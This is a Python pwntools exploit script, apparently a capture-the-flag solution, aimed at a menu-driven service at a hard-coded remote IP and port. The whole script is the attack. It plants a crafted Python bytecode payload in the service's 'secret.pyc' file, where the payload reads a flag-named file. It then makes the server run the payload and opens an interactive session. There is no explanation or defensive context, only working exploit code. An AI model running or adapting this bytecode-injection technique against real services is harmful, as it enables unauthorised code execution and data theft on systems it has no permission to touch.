from pwn import *
context.arch = "amd64"

host = '35.201.132.60'
port = 12000
#host = 'localhost'
#port = 6666
r = remote(host, port)
#r = process('./xxx')

pyc = "03f30d0a52b0595a630000000000000000020000004000000073150000006500006400008301006a0100830000474864010053280200000074140000005468335f563372795f5365437233375f463134474e280200000074040000006f70656e740400000072656164280000000028000000002800000000730500000078642e707974080000003c6d6f64756c653e010000007300000000"
pyc = pyc[20:]

r.recvuntil(':')
r.sendline('cbd')
r.recvuntil(':')
r.sendline('0')
r.recvuntil(':')
r.sendline('secret.pyc')
res = r.recvuntil(':').split('\n')[0].strip()
payload = res + pyc
r.sendline('1')
r.recvuntil(':')
r.sendline('secret.pyc')
r.recvuntil(':')
r.sendline(payload)
r.recvuntil(':')
r.sendline('2')
print r.recvuntil(':')
r.sendline('6'*64)

r.interactive()
